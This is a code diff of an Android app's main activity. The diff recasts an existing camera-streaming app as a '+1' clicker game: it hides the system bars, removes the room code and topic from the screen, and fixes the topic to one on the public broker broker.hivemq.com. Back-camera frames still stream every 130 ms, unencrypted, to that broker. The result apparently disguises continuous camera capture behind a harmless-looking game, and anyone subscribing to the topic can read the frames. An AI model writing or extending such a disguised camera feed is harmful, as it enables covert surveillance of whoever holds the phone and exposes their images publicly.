@@ -4,16 +4,19 @@ import android.Manifest
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.graphics.Color
 import android.graphics.ImageFormat
 import android.graphics.Matrix
 import android.graphics.Rect
+import android.graphics.Typeface
 import android.graphics.YuvImage
 import android.os.Bundle
 import android.util.Base64
 import android.util.Size
+import android.view.View
 import android.view.WindowManager
 import android.widget.Button
-import android.widget.EditText
+import android.widget.FrameLayout
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import androidx.camera.core.CameraSelector
@@ -24,6 +27,9 @@ import androidx.camera.lifecycle.ProcessCameraProvider
 import androidx.camera.view.PreviewView
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import androidx.core.view.WindowCompat
+import androidx.core.view.WindowInsetsCompat
+import androidx.core.view.WindowInsetsControllerCompat
 import org.eclipse.paho.client.mqttv3.MqttClient
 import org.eclipse.paho.client.mqttv3.MqttConnectOptions
 import org.eclipse.paho.client.mqttv3.MqttMessage
@@ -31,41 +37,50 @@ import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
 import java.io.ByteArrayOutputStream
 import java.util.concurrent.Executors
 import java.util.concurrent.atomic.AtomicBoolean
+import kotlin.random.Random
 
 class MainActivity : AppCompatActivity() {
 
+    private lateinit var raiz: FrameLayout
     private lateinit var previewView: PreviewView
     private lateinit var tvStatus: TextView
-    private lateinit var etCode: EditText
+    private lateinit var tvContador: TextView
     private lateinit var btnVermelho: Button
 
     private val executor = Executors.newSingleThreadExecutor()
     private val ocupado = AtomicBoolean(false)
 
     @Volatile private var mqtt: MqttClient? = null
-    @Volatile private var topico = ""
     private var ultimoEnvio = 0L
+    private var cliques = 0
 
     private val intervaloMs = 130L
     private val broker = "tcp://broker.hivemq.com:1883"
-    private val baseTopico = "venice/cam/"
+    private val topico = "venice/cam/pc"
     private val larguraMax = 640
     private val reqCamera = 1001
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
 
+        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
+        WindowCompat.setDecorFitsSystemWindows(window, false)
+        WindowInsetsControllerCompat(window, window.decorView).apply {
+            hide(WindowInsetsCompat.Type.systemBars())
+            systemBarsBehavior =
+                WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
+        }
+
+        raiz = findViewById(R.id.raiz)
         previewView = findViewById(R.id.preview)
         tvStatus = findViewById(R.id.tvStatus)
-        etCode = findViewById(R.id.etCode)
+        tvContador = findViewById(R.id.tvContador)
         btnVermelho = findViewById(R.id.btnVermelho)
 
-        // Botao vermelho: nao faz nada
-        btnVermelho.setOnClickListener { }
+        btnVermelho.setOnClickListener { v -> soltarMaisUm(v) }
 
-        etCode.setText((1000..9999).random().toString())
+        tvStatus.text = "ligando..."
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                 == PackageManager.PERMISSION_GRANTED) {
@@ -83,14 +98,41 @@ class MainActivity : AppCompatActivity() {
             && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             iniciarTudo()
         } else {
-            tvStatus.text = "Camera negada"
+            tvStatus.text = "sem camera"
         }
     }
 
+    // ---------- clicker ----------
+    private fun soltarMaisUm(v: View) {
+        cliques++
+        tvContador.text = cliques.toString()
+
+        val t = TextView(this)
+        t.text = "+1"
+        t.setTextColor(Color.WHITE)
+        t.textSize = 30f
+        t.setTypeface(null, Typeface.BOLD)
+        t.setShadowLayer(8f, 0f, 0f, Color.BLACK)
+
+        val lp = FrameLayout.LayoutParams(
+            FrameLayout.LayoutParams.WRAP_CONTENT,
+            FrameLayout.LayoutParams.WRAP_CONTENT
+        )
+        lp.leftMargin = (v.x + v.width / 2f).toInt() - 25 + Random.nextInt(-50, 50)
+        lp.topMargin = (v.y + v.height / 2f).toInt() - 30
+        t.layoutParams = lp
+        raiz.addView(t)
+
+        t.animate()
+            .translationY(-190f)
+            .alpha(0f)
+            .setDuration(900)
+            .withEndAction { raiz.removeView(t) }
+            .start()
+    }
+
+    // ---------- camera + envio ----------
     private fun iniciarTudo() {
-        val codigo = etCode.text.toString().trim().ifEmpty { "1234" }
-        topico = baseTopico + codigo
-        tvStatus.text = "Sala $codigo - ligando..."
         iniciarCamera()
         conectarMqtt()
     }
@@ -112,7 +154,7 @@ class MainActivity : AppCompatActivity() {
                 provider.bindToLifecycle(
                     this, CameraSelector.DEFAULT_BACK_CAMERA, preview, analise)
             } catch (e: Exception) {
-                tvStatus.text = "Erro camera: ${e.message}"
+                tvStatus.text = "erro camera"
             }
         }, ContextCompat.getMainExecutor(this))
     }
@@ -130,9 +172,9 @@ class MainActivity : AppCompatActivity() {
                 }
                 c.connect(opt)
                 mqtt = c
-                runOnUiThread { tvStatus.text = "No ar - sala $topico" }
+                runOnUiThread { tvStatus.text = "no ar" }
             } catch (e: Exception) {
-                runOnUiThread { tvStatus.text = "Falha conexao: ${e.message}" }
+                runOnUiThread { tvStatus.text = "offline" }
             }
         }.start()
     }
@@ -160,7 +202,7 @@ class MainActivity : AppCompatActivity() {
             bmp.compress(Bitmap.CompressFormat.JPEG, 55, out)
             publicar(Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP))
         } catch (e: Exception) {
-            // ignora frame ruim
+            // frame ruim, ignora
         } finally {
             image.close()
             ocupado.set(false)
